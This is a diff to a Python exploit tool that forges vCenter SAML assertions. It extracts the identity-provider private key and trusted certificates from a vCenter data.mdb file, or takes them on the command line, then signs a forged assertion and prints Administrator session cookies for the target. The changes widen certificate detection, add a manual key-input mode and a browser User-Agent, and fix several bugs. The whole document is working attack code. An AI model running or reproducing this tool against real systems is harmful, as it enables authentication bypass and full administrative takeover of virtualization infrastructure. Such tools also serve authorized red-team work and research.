@@ -10,6 +10,7 @@ from urllib.parse import parse_qs, quote, unquote, urlparse
 import socket
 import ssl
 import OpenSSL.crypto as crypto
+from cryptography import x509
 
 import ldap
 import lxml.etree as etree
@@ -21,6 +22,9 @@ from dateutil.relativedelta import relativedelta
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 session = requests.Session()
+session.headers.update({
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"
+})
 
 idp_key_flag = b'\x30\x82'
 trusted_cert1_flag1 = b'\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x31\x2c\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x69\x66\x69\x63\x61\x74\x65\x43\x68\x61\x69\x6e\x73\x2c' # cn=TrustedCertChain-1,cn=TrustedCertificateChains,
@@ -28,6 +32,7 @@ trusted_cert1_flag2 = b'\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74
 trusted_cert1_flag3 = idp_key_flag
 trusted_cert2_flag1 = b'\x01\x00\x12\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x31' # \x01\x00\x12TrustedCertChain-1
 trusted_cert2_flag2 = b'\x01\x00\x12\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x32' # \x01\x00\x12TrustedCertChain-2
+trusted_cert2_flag3 = idp_key_flag
 not_it_list = [b'Engineering', b'California', b'object']
 
 SAML_TEMPLATE = \
@@ -91,7 +96,7 @@ def writepem(bytes, verbose):
     data = base64.encodebytes(bytes).decode("utf-8").rstrip()
     cert = "-----BEGIN CERTIFICATE-----\n" + data + "\n-----END CERTIFICATE-----"
     if verbose:
-        print('[*] Extracted Trusted certificate:')
+        print('[*] Extracted a candidate for the Trusted certificate:')
         print(cert + '\n')
 
     return cert
@@ -134,13 +139,21 @@ def check_cert_valid(cert_bytes, verbose=False):
 
 
 def check_cert_root_ca(cert_bytes, verbose=False):
-    cert = crypto.load_certificate(crypto.FILETYPE_PEM, cert_bytes)
-    for ext in cert.get_extensions():
-        short_name = ext.get_short_name()
-        if short_name == b'basicConstraints':
-            if 'CA:TRUE' in str(ext):
-                return True
-            break
+    if isinstance(cert_bytes, str):
+        cert_bytes = cert_bytes.encode()
+    try:
+        cert = x509.load_pem_x509_certificate(cert_bytes)
+    except ValueError:
+        if verbose:
+            print("[!] Crypto error: could not load certificate")
+        return False
+
+    try:
+        bc = cert.extensions.get_extension_for_class(x509.BasicConstraints)
+        if bc.value.ca:
+            return True
+    except x509.ExtensionNotFound:
+        pass
 
     if verbose:
         print("[!] Certificate is not a root certificate")
@@ -197,7 +210,7 @@ def get_idp_key(idp_key_candidates, trusted_cert1, verbose=False):
             return candidate
 
     print('[-] Failed to extract the IdP key')
-    sys.exit()
+    return False
 
 
 def get_domain_from_cn(cn):
@@ -219,20 +232,20 @@ def get_trusted_cert1_pem(stream, verbose=False):
     if verbose:
         print(f'[!] Cert 1 size: {cert1_size}')
 
-    if b'ssoserverSign' not in cert1_bytes:
+    if b'ssoserverSign' not in cert1_bytes and b'STS' not in cert1_bytes:
         if verbose:
-            print('[!] Cert does not contain ssoserverSign - keep looking')
+            print('[!] Cert does not contain ssoserverSign or STS - keep looking')
         return 
 
     if not check_cert_valid(cert1_bytes):
         return 
     cert1 = writepem(cert1_bytes, verbose)
 
-    print('[*] Successfully extracted trusted certificate 1')
     return cert1
 
 
-def get_trusted_cert1(stream, domain_lookup=True, verbose=False):
+def get_trusted_cert1_candidates(stream, domain_lookup=True, verbose=False):
+    cert1_candidates = []
     if domain_lookup:
         for trusted_cert1_flag in [trusted_cert1_flag1, trusted_cert1_flag2]:
             tup = stream.findall(trusted_cert1_flag)
@@ -265,50 +278,125 @@ def get_trusted_cert1(stream, domain_lookup=True, verbose=False):
                     stream.readto(f'0x0002', bytealigned=True)
                     cert1 = get_trusted_cert1_pem(stream, verbose)
                     if cert1 is not None:
-                        return cert1, domain
+                        print('[*] Found a candidate for trusted certificate 1')
+                        cert1_candidates.append((cert1, domain))
     else:
         tup = stream.findall(trusted_cert1_flag3)
         matches = list(tup)
         if matches:
             for match in matches:
+                check_pos = match + 32
+                if stream[check_pos : check_pos + 16] != '0x3082':
+                    continue
+
                 stream.pos = match - 16
                 cert1 = get_trusted_cert1_pem(stream, verbose)
                 if cert1 is not None:
-                    return cert1
-    print(f'[-] Failed to find the trusted certificate 1')
+                    print('[*] Found a candidate for trusted certificate 1')
+                    cert1_candidates.append((cert1, None))
+    if not cert1_candidates:
+        print(f'[-] Failed to find the trusted certificate 1')
+    return cert1_candidates
+
+
+def get_trusted_cert2_pem(stream, verbose=False):
+    # Get TrustedCertificate2 pem 1
+    cert2_size_hex = stream.read('bytes:2')
+    cert2_size = int(cert2_size_hex.hex(), 16)
+    cert2_bytes = stream.read(f'bytes:{cert2_size}')
+    if verbose:
+        print(f'[!] Cert 2 size: {cert2_size}')
+
+    if not check_cert_valid(cert2_bytes, verbose) or not check_cert_root_ca(writepem(cert2_bytes, verbose)):
+        if verbose:
+            print('[!] Cert is not a root CA - keep looking')
+        return
+    cert2 = writepem(cert2_bytes, verbose)
+
+    print('[*] Successfully extracted trusted certificate 2')
+    return cert2
 
 
 def get_trusted_cert2(stream, verbose=False):
-    # Get TrustedCertificate1 pem2
     for trusted_cert2_flag in [trusted_cert2_flag1, trusted_cert2_flag2]:
         tup = stream.findall(trusted_cert2_flag)
         matches = list(tup)
         for match in matches:
-            stream.pos = match - 10240
+            for shift in [10240, 15360, 20480]:
+                stream.pos = match - shift
 
-            try:
-                start = stream.readto('0x3082', bytealigned=True)
-            except:
-                print('Failed finding cert 2')
-                sys.exit()
+                try:
+                    stream.readto('0x3082', bytealigned=True)
+                except:
+                    break
 
-            stream.pos = stream.pos - 32
-            cert2_size_hex = stream.read('bytes:2')
-            cert2_size = int(cert2_size_hex.hex(), 16)
-            cert2_bytes = stream.read(f'bytes:{cert2_size}')
-            if verbose:
-                print(f'Cert 2 Size: {cert2_size}')
+                stream.pos = stream.pos - 32
+                cert2 = get_trusted_cert2_pem(stream, verbose)
+                if cert2 is not None:
+                    return cert2
+    else:
+        tup = stream.findall(trusted_cert2_flag3)
+        matches = list(tup)
+        if matches:
+            for match in matches:
+                check_pos = match + 32
+                if stream[check_pos : check_pos + 16] != '0x3082':
+                    continue
 
-            if not check_cert_valid(cert2_bytes, verbose) and not check_cert_root_ca(writepem(cert2_bytes), verbose):
-                continue
-
-            cert2 = writepem(cert2_bytes, verbose)
-
-            print('[*] Successfully extracted trusted certificate 2')
-            return cert2
-
+                stream.pos = match - 16
+                cert2 = get_trusted_cert2_pem(stream, verbose)
+                if cert2 is not None:
+                    return cert2
     print(f'[-] Failed to find the trusted cert 2')
     sys.exit()
+
+
+def read_file(path, label):
+    """Read a PEM/text file supplied on the command line"""
+    try:
+        with open(path, 'r') as f:
+            return f.read()
+    except OSError as e:
+        print(f'[-] Failed reading {label} from {path}: {e}')
+        sys.exit()
+
+
+def cert_subject_cn(cert_str):
+    """Return the Subject CN of a PEM certificate, or None on failure"""
+    try:
+        cert = crypto.load_certificate(crypto.FILETYPE_PEM, cert_str)
+        return cert.get_subject().CN
+    except crypto.Error:
+        return None
+
+
+def validate_manual_certs(cert1, cert2, verbose=False):
+    """
+    In manual mode, cert1 must be the signing cert (CN=ssoserverSign or CN=STS)
+    and cert2 must be the root CA (CA:TRUE).
+    If they were supplied in the wrong order, swap them; otherwise warn.
+    """
+    cert1_is_signer = cert_subject_cn(cert1) in ['ssoserverSign', 'STS']
+    cert2_is_signer = cert_subject_cn(cert2) in ['ssoserverSign', 'STS']
+    cert1_is_ca = check_cert_root_ca(cert1)
+    cert2_is_ca = check_cert_root_ca(cert2)
+
+    if cert1_is_signer and cert2_is_ca:
+        if verbose:
+            print('[*] cert1 (CN=ssoserverSign or CN=STS) and cert2 (CA:TRUE) look correct')
+        return cert1, cert2
+
+    if cert2_is_signer and cert1_is_ca:
+        print('[!] --cert1 and --cert2 appear to be reversed - swapping them')
+        return cert2, cert1
+
+    if not cert1_is_signer:
+        print("[!] Warning: --cert1 Subject CN is not 'ssoserverSign' or 'STS' "
+              f"(got {cert_subject_cn(cert1)!r})")
+    if not cert2_is_ca:
+        print('[!] Warning: --cert2 is not a root certificate (CA:TRUE not found)')
+    return cert1, cert2
+
 
 def saml_request(vcenter):
     """Get SAML AuthnRequest from vCenter web UI"""
@@ -318,10 +406,13 @@ def saml_request(vcenter):
         if r.status_code != 302:
             raise Exception("expected 302 redirect")
         o = urlparse(r.headers["location"])
-        sr = parse_qs(o.query)["SAMLRequest"][0]
+        query = parse_qs(o.query)
+        sr = query["SAMLRequest"][0]
         dec = base64.decodebytes(sr.encode("utf-8"))
         req = zlib.decompress(dec, -8)
-        return etree.fromstring(req), parse_qs(o.query)["RelayState"][0]
+        if "RelayState" in query:
+            return etree.fromstring(req), query["RelayState"][0]
+        return etree.fromstring(req), None
     except:
         print(f'[-] Failed initiating SAML request with {vcenter}')
         raise
@@ -348,6 +439,7 @@ def fill_template(vcenter_hostname, vcenter_ip, vcenter_domain, req):
     except:
         print('[-] Failed generating the SAML assertion')
         raise
+
 
 def sign_assertion(root, cert1, cert2, key):
     """Sign the SAML assertion in the response using the IdP key"""
@@ -393,6 +485,7 @@ def sign_assertion(root, cert1, cert2, key):
         print('[-] Failed signing the SAML assertion')
         raise
 
+
 def login(vcenter, saml_resp, relaystate):
     """Log in to the vCenter web UI using the signed response and return a session cookie"""
     try:
@@ -413,7 +506,7 @@ def login(vcenter, saml_resp, relaystate):
         if r.status_code != 302:
             raise Exception("expected 302 redirect")
         cookies = r.headers["Set-Cookie"].split(",")
-        print(f'[+] Successfuly obtained Administrator cookies for {vcenter}!')
+        print(f'[+] Successfully obtained Administrator cookies for {vcenter}!')
         print(f'[+] Cookies:')
         for cookie in cookies:
             print("\t" + cookie.lstrip())
@@ -440,36 +533,85 @@ def get_hostname(vcenter):
         print(f'[*] Found hostname {hostname} for {vcenter}')
         return hostname
     except:
-        print('[-] Failed obtaining hostname from SSL certificates for {vcenter}')
+        print(f'[-] Failed obtaining hostname from SSL certificates for {vcenter}')
         raise
 
 
 if __name__ == '__main__':
-    parser = argparse.ArgumentParser()
-    parser.add_argument('-p', '--path', help='The path to the data.mdb file', required=True)
+    parser = argparse.ArgumentParser(
+        description='Forge a vCenter SAML assertion. Provide EITHER the data.mdb file '
+                    '(-p, which is parsed for all the elements below) OR the individual '
+                    'extracted elements (--idp-key, --cert1, --cert2 and -d).',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog=(
+            'Examples:\n'
+            '  From an mdb file:\n'
+            '    %(prog)s -p data.mdb -t 10.0.0.1\n'
+            '  From individually-supplied elements:\n'
+            '    %(prog)s -t 10.0.0.1 -d vsphere.local \\\n'
+            '        --idp-key idp.key --cert1 ssoserverSign.pem --cert2 ca.pem\n'
+        ),
+    )
+    parser.add_argument('-p', '--path', help='The path to the data.mdb file')
     parser.add_argument('-t', '--target', help='The IP address of the target', required=True)
-    parser.add_argument('-d', '--domain', help='vCenter SSO domain')
+    parser.add_argument('-d', '--domain', help='vCenter SSO domain (required in manual mode)')
+    parser.add_argument('--idp-key', help='Manual mode: path to the IdP private key (PEM). Used instead of --path')
+    parser.add_argument('--cert1', help="Manual mode: path to trusted certificate 1 - the signing cert with Subject CN=ssoserverSign or CN=STS (PEM). Used instead of --path")
+    parser.add_argument('--cert2', help='Manual mode: path to trusted certificate 2 - the root CA cert with CA:TRUE (PEM). Used instead of --path')
     parser.add_argument('-v', '--verbose', action='store_true', help='Print the extracted certificates and private key')
     args = parser.parse_args()
 
-    # Extract certificates and private key
-    in_stream = open(args.path, 'rb')
-    bin_stream = bitstring.ConstBitStream(in_stream)
-    idp_key_candidates = get_idp_key_candidates(bin_stream, args.verbose)
+    if args.path:
+        # Extract certificates and private key from the data.mdb file
+        in_stream = open(args.path, 'rb')
+        bin_stream = bitstring.ConstBitStream(in_stream)
+        idp_key_candidates = get_idp_key_candidates(bin_stream, args.verbose)
 
-    if args.domain is None:
-        trusted_cert_1, domain = get_trusted_cert1(bin_stream, domain_lookup=True, verbose=args.verbose)
+        if args.domain is None:
+            trusted_cert_1_candidates = get_trusted_cert1_candidates(bin_stream, domain_lookup=True, verbose=args.verbose)
+        else:
+            trusted_cert_1_candidates = get_trusted_cert1_candidates(bin_stream, domain_lookup=False, verbose=args.verbose)
+            domain = args.domain
+
+        for cert_1_cd, domain_cd in trusted_cert_1_candidates:
+            idp_key = get_idp_key(idp_key_candidates, cert_1_cd, args.verbose)
+            if idp_key:
+                print('[*] Successfully extracted trusted certificate 1')
+                trusted_cert_1 = cert_1_cd
+                domain = domain_cd if domain_cd is not None else domain
+                break
+        else:
+            sys.exit()
+
+        trusted_cert_2 = get_trusted_cert2(bin_stream, args.verbose)
     else:
-        trusted_cert_1 = get_trusted_cert1(bin_stream, domain_lookup=False, verbose=args.verbose)
-        domain = args.domain
+        # Use the individually-supplied elements instead of parsing an mdb file
+        missing = [
+            name for name, val in (
+                ('--idp-key', args.idp_key),
+                ('--cert1', args.cert1),
+                ('--cert2', args.cert2),
+                ('-d/--domain', args.domain),
+            ) if not val
+        ]
+        if missing:
+            parser.error(
+                'either -p/--path OR all of --idp-key, --cert1, --cert2 and -d/--domain '
+                'must be provided. Missing: ' + ', '.join(missing)
+            )
 
-    idp_key = get_idp_key(idp_key_candidates, trusted_cert_1, args.verbose)
-    trusted_cert_2 = get_trusted_cert2(bin_stream, args.verbose)
+        idp_key = read_file(args.idp_key, 'IdP key')
+        trusted_cert_1 = read_file(args.cert1, 'trusted certificate 1')
+        trusted_cert_2 = read_file(args.cert2, 'trusted certificate 2')
+        domain = args.domain
+        trusted_cert_1, trusted_cert_2 = validate_manual_certs(
+            trusted_cert_1, trusted_cert_2, args.verbose)
+        print('[*] Using IdP key, trusted certificates and domain supplied on the command line')
 
     # Generate SAML request
     hostname = get_hostname(args.target)
     req, relaystate = saml_request(args.target)
-    t = fill_template(hostname, args.target, domain,req)
+    t = fill_template(hostname, args.target, domain, req)
     s = sign_assertion(t, trusted_cert_1, trusted_cert_2, idp_key)
     c = login(args.target, s, relaystate)
 
